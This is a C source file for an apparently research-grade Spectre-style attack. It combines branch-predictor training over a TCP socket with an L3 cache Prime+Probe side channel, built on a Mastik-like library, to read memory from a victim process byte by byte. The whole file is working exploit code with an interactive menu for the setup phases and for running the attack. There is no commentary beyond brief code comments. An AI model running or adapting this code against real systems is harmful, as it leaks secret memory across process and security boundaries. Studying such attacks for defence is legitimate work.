#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h> 			//close

#include <util.h>
#include <l3.h>
#include <low.h>

#include<string.h>   			//strlen
#include<sys/socket.h>  		//socket
#include<arpa/inet.h>			//inet_addr
#include <fcntl.h>
#include <errno.h>

#include <pthread.h>
#include <inttypes.h>
#include <sys/timeb.h>

#include <sys/stat.h>

// Victim Properties
#define ARRAY1_SIZE 16 			//Debug
#define VICTIM_IP "127.0.0.1"
#define VICTIM_PORT 8888

// Parameters
#define SAMPLES 1000			//Number of PRIME+PROBE operations per set
#define INTERVAL 90000			//CPU Clock cycles between PRIME+PROBE operations
#define WINDOW 3000000			//CPU Clock cycles of ATTACK and IDLE windows
#define TOMONITOR 1				//Number of sets to be PRIMEd at the same INTERVAL in parallel
#define SCORE_THRESHOLD 0.8
#define SCORE_LOWBOUND 0.55
#define MAX_CMPS 150



#define OOS_THRESHOLD 0.05
#define EXTRASPACE 200
#define GAP_THRESHOLD 0.05
#define SWAP_SLICES_THRESHOLD 0.75
#define MIN_CMPS 30
#define THRESH_FOR_SETUP 0.9
// Slices & Macros
#define NSLICES 4
#if NSLICES == 4
#define ADDR2SET(x) 	(int)(((uint64_t)x >> 6) & 0x7ff)
#define RAWSET(set) 	(set & 0x7ff)
#define SLICESBITS 		11
#elif NSLICES == 8
#define ADDR2SET(x) 	(int)(((uint64_t)x >> 6) & 0x3ff)
#define RAWSET(set) 	(set & 0x3ff)
#define SLICESBITS 		10
#endif
#define SLICE(set) 		(set >> SLICESBITS)

#define DELAY(x) for(volatile int z = 0; z < x; z++);

//socket
int target_sock;
struct sockaddr_in server_struct;

//Mastik
l3pp_t l3;

int nsets;						//Number of sets
int nslices;					//Number of slices

uint32_t array1_size_set;
uint32_t attack_length;			//Nubmer of Bytes to attack

char pp_flag = 0;
char pp_oos_err = 0;
int pp_samples;
int pp_interval;
char pp_run;

volatile int attack_flag = 1;	//ATTACK or IDLE indicator

pthread_mutex_t lock_pp = PTHREAD_MUTEX_INITIALIZER;

uint16_t monitor_res[SAMPLES*TOMONITOR*EXTRASPACE] = {0};
int monitor_res_indicator[SAMPLES*TOMONITOR*EXTRASPACE] = {0};


uint64_t interval = INTERVAL;
uint64_t window = WINDOW;
uint64_t samples = SAMPLES;
uint32_t tomonitor = TOMONITOR;
uint32_t nmonitored = 0;

int * monitoredlines;
unsigned char * suspected_sets;

size_t malicious_x = 0;			//Attack victim via malicious_x


__always_inline int flush_set(int c){ // Flush set for cache
	uint8_t res;
	res = l3_probecount_set(l3,c);
	return res;
}

__always_inline void send_to_victim_x(size_t x){
	send(target_sock , &x , sizeof(size_t) , 0);
}

int guard(int n, char * err) { if (n == -1) { perror(err); exit(1); } return n; }


void* wrap_inline(){
	return __builtin_return_address(0);
}


void set_pp_params(char run, int samples, int interval){
	pthread_mutex_lock(&lock_pp);
	pp_run = run;
	pp_samples = samples;
	pp_interval = interval;
	pp_flag = 1;
	pthread_mutex_unlock(&lock_pp);
}

int get_pp_flag(){
	char res;
	pthread_mutex_lock(&lock_pp);
	res = pp_flag;
	pthread_mutex_unlock(&lock_pp);
	return res;
}

int get_pp_oos_err(){
	char res;
	pthread_mutex_lock(&lock_pp);
	res = pp_oos_err;
	pthread_mutex_unlock(&lock_pp);
	return res;
}


int uint32Input() {
	char input[64];
	printf ("> ");
	fflush(stdout);
	uint32_t result;

	if (fgets(input, 64, stdin) != NULL) {
		result = atoi(input);
	} else {
		perror("input");
	}
	return result;
}

int uint64Input() {
	char input[64];
	printf ("> ");
	fflush(stdout);
	uint64_t result;

	if (fgets(input, 64, stdin) != NULL) {
		result = strtoul(input,NULL,10);
	} else {
		perror("input");
	}
	return result;
}


void *receive_signal(void *args){
	int oos, samples, interval;
	char run;


	pthread_mutex_lock(&lock_pp);
	pp_oos_err = 0;
	pthread_mutex_unlock(&lock_pp);


	while(1){
		oos = 0;
		while(1){
			pthread_mutex_lock(&lock_pp);
			if(pp_flag){
				samples = pp_samples;
				interval = pp_interval;
				run = pp_run; //ATTACK start flag
				pthread_mutex_unlock(&lock_pp);
				break;
			}
			pthread_mutex_unlock(&lock_pp);
		}

		if (run){
			//PRIME+PROBE for #SAMPLES operations
			oos = l3_repeatedprobecount_with_indicator(l3,samples,monitor_res,monitor_res_indicator,interval,&attack_flag);
		}


		pthread_mutex_lock(&lock_pp);
		pp_oos_err |= (oos >= samples * OOS_THRESHOLD);
		if(oos >= samples * OOS_THRESHOLD && run)
			printf("# pp_oos_err = %d / %d\n",oos,samples); fflush(stdout);
		pp_flag = 0;
		pthread_mutex_unlock(&lock_pp);


		if (!run)
			break;
	}


	printf("# waiting for join...\n");
	return EXIT_SUCCESS;
}


void send_signal(size_t x, unsigned char setup_flag){
	uint64_t s,t;
	size_t train_x = 0;
	uint64_t attack_state = 1;

	if(setup_flag!=1) // Setup routine - phase 2 or attack
		while(get_pp_flag()){ //Until receive_signal ends its PRIME+PROBE
			s = rdtscp64();
			t = 0;
			while(t < window){
				flush_set(array1_size_set);
				send_to_victim_x(train_x);
				flush_set(array1_size_set);
				send_to_victim_x(train_x);
				flush_set(array1_size_set);

				if (attack_flag){
					send_to_victim_x(x);
				}else{
					memaccess(&x);
					send_to_victim_x(x-(train_x & 0x1 ? -1 : 1));
				}
				t = rdtscp64() - s;
			}

			attack_state = (attack_state + 1) & 0x7;	//0-7
			attack_flag = attack_state & 0x1;			//0-1
			train_x = (attack_state >> 1) & 0x3;		//0-3 once every two windows
		}
	else // Setup routine - phase 1
		while(get_pp_flag()){ //until pp end
			s = rdtscp64();
			t = 0;
			while(t < window){
				if (attack_flag){
					DELAY(166);
					send_to_victim_x(x);
				}else{
					DELAY(166);
					send_to_victim_x(-1);
					DELAY(166);
					send_to_victim_x(-1);
					memaccess(&x);
				}
				t = rdtscp64() - s;
			}
			attack_flag = !attack_flag;
		}

}


void scoring(int * num_of_comps_tmp, float * scores_tmp, int * activity, int * oos, int nmonitored,int samples){
	//Scoring function for the sets that were PROBEd
	for (int offset = 0; offset < nmonitored; offset++){
		uint32_t attack_misses = 0;
		uint32_t idle_misses = 0;
		uint32_t attack_len = 0;
		uint32_t idle_len = 0;

		num_of_comps_tmp[offset] = 0;
		for(int i = offset; i < samples*nmonitored; i+=nmonitored){
			if(monitor_res[i] == (uint16_t)-1){
				if (NULL != oos) oos[offset]++;
				continue;
			} else if (monitor_res[i] > 0){
				if (NULL != activity) activity[offset]++;
			}
			if(monitor_res_indicator[i]){ 		//indicator = attack
				attack_len++;
				attack_misses += monitor_res[i];
			} else { 							//indicator = idle
				idle_len++;
				idle_misses += monitor_res[i];
			}
			if(i > offset && monitor_res_indicator[i-nmonitored] == 0 && monitor_res_indicator[i] == 1){ // now we have {attack samples, idle samples} time to compare
				num_of_comps_tmp[offset]++;
				float attack_avg = (float)attack_misses / attack_len;	//ATTACK window average
				float idle_avg = (float)idle_misses / idle_len;			//IDLE window average
				scores_tmp[offset] += (attack_avg) > (idle_avg);
				attack_len = 0; idle_len = 0; attack_misses = 0; idle_misses = 0;
			}
		}
	}
}


int find_sets_to_monitor(int set_offset,int potential_sets, int * scouted_sets){
	//Add up to #tomonitor sets to the PRIME+PROBE operation
	int count_tmp = 0;
	int set_start_index=0;
	for(; set_start_index<potential_sets;set_start_index++){
		if(suspected_sets[set_start_index]==0){
			count_tmp++;
			if((count_tmp-1)/tomonitor==set_offset)
				break;
		}

	}

	l3_unmonitorall(l3);
	count_tmp = 0;
	for (; count_tmp < tomonitor && set_start_index<potential_sets; set_start_index++){
		if(suspected_sets[set_start_index]==0){
			count_tmp++;
			(*scouted_sets)++;
			if(potential_sets==256)
				l3_monitor(l3,set_start_index*4);
			else
				l3_monitor(l3,set_start_index);
		}
	}

	return l3_getmonitoredset(l3,monitoredlines,nsets);
}


int attack_routine(size_t x, unsigned char * value, int potential_sets, unsigned char setup_flag) {

	float *scores = calloc(potential_sets,sizeof(float));
	float *scores_tmp = calloc(potential_sets,sizeof(float));
	int *num_of_comps = calloc(potential_sets,sizeof(int));
	int *num_of_comps_tmp = calloc(potential_sets,sizeof(int));


	char ok = 0;

	while(!ok){

		int scouted_sets = 0;			//Number of candidates sets

		for(int set_offset=0;set_offset<potential_sets/tomonitor;set_offset++){

			bzero(scores_tmp,potential_sets*sizeof(float));
			bzero(num_of_comps_tmp,potential_sets*sizeof(int));
			nmonitored = find_sets_to_monitor(set_offset,potential_sets, &scouted_sets);
			if(nmonitored==0) break;

			set_pp_params(1,samples,interval); 				// receive_signal start
			send_signal(x,setup_flag);						// send_signal start
			scoring(num_of_comps_tmp,scores_tmp,NULL,NULL,nmonitored,samples);

			for(int i=0;i<nmonitored;i++){
				if(potential_sets==256){
					scores[monitoredlines[i]/4]+=scores_tmp[i];
					num_of_comps[monitoredlines[i]/4]+=num_of_comps_tmp[i];
				}else{
					scores[monitoredlines[i]]+=scores_tmp[i];
					num_of_comps[monitoredlines[i]]+=num_of_comps_tmp[i];
				}
			}

			l3_unmonitorall(l3);
		}

		//Find 1st and 2nd highest scores

		int j,k,i;
		j = k = -1;
		for (i = 0; i < potential_sets; i++) {
			if (j < 0 || scores[i]/num_of_comps[i] >= scores[j]/num_of_comps[j]) {
				k = j; j = i;
			} else if (k < 0 || scores[i]/num_of_comps[i] >= scores[k]/num_of_comps[k]) {
				k = i;
			}
		}
		if(!setup_flag)
			printf("1st = %d, score = %f (%d) , 2nd = %d, score = %f (%d) , Gap = %f,scouted_sets=%d\n",j,scores[j]/num_of_comps[j],num_of_comps[j],k,scores[k]/num_of_comps[k],num_of_comps[k], (scores[j]/num_of_comps[j]-scores[k]/num_of_comps[k]),scouted_sets);
		ok = ((scores[j]/num_of_comps[j] > SCORE_THRESHOLD) && ((scores[j]/num_of_comps[j]-scores[k]/num_of_comps[k]) > GAP_THRESHOLD) && num_of_comps[j] > MIN_CMPS);
		*value = j;
		if(num_of_comps[j]>MAX_CMPS || scouted_sets==0) break;
		if(!ok)
			for (int tmpi = 0; tmpi < potential_sets; tmpi++)
				if(num_of_comps[tmpi] > 0 && scores[tmpi]/num_of_comps[tmpi]<SCORE_LOWBOUND)
					suspected_sets[tmpi]=1;
	}
	if(setup_flag){
		printf("Potential sets for array1[x], array2[array1[x]*256]: \n");
		for(int i=0;i<potential_sets;i++){
			if(scores[i]/num_of_comps[i]>THRESH_FOR_SETUP){
				printf("set %d, score: %.2f (%d comps)\n",i, scores[i]/num_of_comps[i],num_of_comps[i]);
			}
		}
	}
	free(scores);
	free(scores_tmp);
	free(num_of_comps);
	free(num_of_comps_tmp);
	return ok;

}



void thread_setup(pthread_t * pp_thread){
	uint64_t s,t;
	int count;
	char oos_err;
	char thread_setup_done = 0;
	while(!thread_setup_done){ //repeat until the threads do not context switch between them
		if (pthread_create(pp_thread, NULL, &receive_signal, (void*)NULL)) {
			printf("pthread_create failed\n"); fflush(stdout);
			exit(EXIT_FAILURE);
		}

		set_pp_params(1,samples,interval);

		//send x until pp end
		s = rdtscp64();
		t = 0;
		count = 0;
		while(get_pp_flag()){
			send_to_victim_x(0);
			count++;
		}
		oos_err = get_pp_oos_err();

		if (oos_err){ //set thread to finish and wait
			set_pp_params(0,0,0);
			while(get_pp_flag());
			break;
		}


		if (!oos_err){
			printf("# thread setup done!\n"); fflush(stdout);
			thread_setup_done = 1;
		} else {
			printf("# thread setup failed, trying again...\n"); fflush(stdout);
			if (pthread_join(*pp_thread, NULL)) {
				printf("# pthread_join failed\n"); fflush(stdout);
				exit(EXIT_FAILURE);
			} else {
				printf("# pthread_join success\n");
			}
		}
	}
}


int main(int argc, const char **argv)
{
	printf("format ./prog <malicious_x> <array1_size_set> <attack_length>\n");
	delayloop(3000000000U);
	l3 = l3_prepare(NULL);
	nsets = l3_getSets(l3);
	nslices = l3_getSlices(l3);
	monitoredlines = calloc(nsets,sizeof(int));
	suspected_sets = calloc(nsets,sizeof(unsigned char));
	printf("Sets : %d, Slices : %d\n",nsets,nslices); fflush(stdout);

	for (int i = 0; i < nsets; i ++)
		l3_monitor(l3,i);
	l3_unmonitorall(l3);

	//Create socket
	guard(target_sock = socket(AF_INET , SOCK_STREAM , 0),"Could not create socket");
	puts("Socket created");
	server_struct.sin_addr.s_addr = inet_addr(VICTIM_IP);
	server_struct.sin_family = AF_INET;
	server_struct.sin_port = htons( VICTIM_PORT );
	guard(connect(target_sock , (struct sockaddr *)&server_struct , sizeof(server_struct)),"Could not connect");
	puts("Connected");


	pthread_t pp_thread;
	thread_setup(&pp_thread);

	array1_size_set = 0;
	attack_length = 1;
	if (argc > 1)
		malicious_x = strtoul(argv[1],NULL,10);
	if (argc > 2)
		array1_size_set = atoi(argv[2]);
	if (argc > 3)
		attack_length = atoi(argv[3]);

	delayloop(300000U);

	int option = -1;
	uint64_t tmp64;
	uint32_t tmp32;

	while(option != 99){
		printf("--------------------------------------------\n");
		printf("malicious_x = %lu, array1_size_set = %u, attack_length = %u\n",malicious_x,array1_size_set,attack_length);
		printf("interval = %lu, samples = %lu, window = %lu, tomonitor = %u\n",interval,samples,window,tomonitor);

		printf("1) Set malicious_x\n");
		printf("3) Set array1_size_set\n");
		printf("4) Set attack_length\n");
		printf("5) Set interval \t(PRIME+PROBE sample slot) \t[cpu ticks]\n");
		printf("6) Set samples \t\t(PRIME+PROBE samples) \t\t[cpu ticks]\n");
		printf("7) Set window \t\t(activity ON/OFF window) \t[cpu ticks]\n");
		printf("8) Set tomonitor \t(how much sets to monitor in parallel each scan)\n");
		printf("9) Setup - part 1\t(Array1_size value, Array1, Array2)\n");
		printf("10) Setup - part 2\t(Array1_size set)\n");
		printf("11) Perform attack\n");
		printf("99) Exit\n");

		fflush(stdout);
		option = uint32Input();

		switch(option){
		case 1:
			printf("Enter malicious_x: \n");
			fflush(stdout);
			malicious_x = uint64Input();
			break;
		case 3:
			printf("Enter array1_size_set: \n");
			fflush(stdout);
			array1_size_set = uint32Input();
			break;
		case 4:
			printf("Enter attack_length: \n");
			fflush(stdout);
			attack_length = uint32Input();
			break;
		case 5:
			printf("Enter interval: \n");
			fflush(stdout);
			tmp64 = uint64Input();
			interval = tmp64 ? tmp64 : INTERVAL;
			break;
		case 6:
			printf("Enter samples: \n");
			fflush(stdout);
			tmp64 = uint64Input();
			samples = tmp64 ? tmp64 : SAMPLES;
			break;
		case 7:
			printf("Enter window: \n");
			fflush(stdout);
			tmp64 = uint64Input();
			window = tmp64 ? tmp64 : WINDOW;
			break;
		case 8:
			printf("Enter tomonitor: \n");
			fflush(stdout);
			tomonitor = uint32Input();
			break;
		case 9:
			printf("train_x = -1, please enter potentially valid x:\n");
			{
				struct timeb start, end;
				int diff = 0;
				unsigned char value, setup_flag=1;
				size_t x = uint64Input();
				bzero(suspected_sets,nsets*sizeof(unsigned char));
				ftime(&start);
				attack_routine(x ,&value,nsets,setup_flag);
				ftime(&end);
				diff = (int) (1000.0 * (end.time - start.time) + (end.millitm - start.millitm));
				printf("Operation took %u milliseconds\n", diff);
			}
			break;
		case 10:
			printf("Searching for Array1_size at malicious_x=%lu\n",malicious_x);
			{
				struct timeb start, end;
				int diff = 0;
				unsigned char value, setup_flag=2;
				ftime(&start);
				for(int i=0;i<nsets;i++){
					printf("Array1_size set=%d\n",i);
					array1_size_set=i;
					bzero(suspected_sets,nsets*sizeof(unsigned char));
					attack_routine(malicious_x,&value,nsets,setup_flag);
				}
				ftime(&end);
				diff = (int) (1000.0 * (end.time - start.time) + (end.millitm - start.millitm));
				printf("Operation took %u milliseconds\n", diff);

			}
			break;
		case 11:
			printf("Reading %d bytes:\n", attack_length);
			{
				struct timeb start, end;
				int diff = 0;
				unsigned char value, setup_flag=0;
				for (int i = 0; i < attack_length; i++){
					bzero(suspected_sets,256*sizeof(unsigned char));
					printf("Reading at malicious_x = %lu\n", malicious_x + i); fflush(stdout);
					ftime(&start);
					attack_routine(malicious_x + i,&value,256,setup_flag);
					ftime(&end);
					diff = (int) (1000.0 * (end.time - start.time) + (end.millitm - start.millitm));
					printf("Operation took %u milliseconds\n", diff);
				}
			}
			break;


		case 99:
			printf("Exit... \n");
			break;
		}


	}

	free(monitoredlines);
	free(suspected_sets);
	close(target_sock);
	l3_release(l3);

	return EXIT_SUCCESS;
}